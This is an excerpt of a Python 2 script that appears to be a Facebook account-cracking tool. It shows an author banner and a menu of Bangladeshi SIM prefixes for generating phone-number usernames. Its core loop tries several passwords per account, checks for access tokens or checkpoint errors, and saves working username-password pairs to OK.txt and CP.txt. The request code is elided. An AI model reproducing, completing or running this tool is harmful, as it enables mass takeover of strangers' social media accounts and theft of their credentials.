...
\033[94;1m ##     ## ##     ## ####    ##    ##     ## ##    ##         ##     ## 
\033[1;97m--------------------------------------------------
\033[1;91m Author      :  ARIYAN SHUVO
\033[1;91m GitHub      : https://github.com/Ariyan404
\033[1;91m LOVER🙈    :  ARIYAN 
\033[1;91m FACEBOOK     :  ARIYAN 
\033[1;91m VERSOIN   : 4.4.6
\033[1;97m--------------------------------------------------
                                                 """
logo1 = '     \n\n\x1b[4;96mSELECT BD  SIM CODE \x1b[1;0m\n\x1b[1;96m[1] GP    \x1b[1;97m 00,01,02,03,04,05,06,07,08\n\x1b[1;96m[2] ROBI    \x1b[1;97m 11,12,13,14,15,16,17\n\x1b[1;96m[3] BL   \x1b[1;97m 21,22,23,24,25\n\x1b[1;96m[4] AT  \x1b[1;97m 30,31,32,33,34,35\n\x1b[1;96m[5] TL\x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
back = 0
berhasil = []
cekpoint = []
oks = []
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [ARIYAN_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [ARIYAN_OK] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [ARIYAN_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [ARIYAN_OK] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [ARIYAN_OK]  ' + k + c + user + '  ^  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [ARIYAN_OK] ' + k + c + user + '  ^  ' + pass3
                        cps = open('save/CP.txt', 'a')
    ...
    raw_input('\n\x1b[1;97m[\x1b[1;98mARIYAN_menu_Back\x1b[1;95m]')
    login()
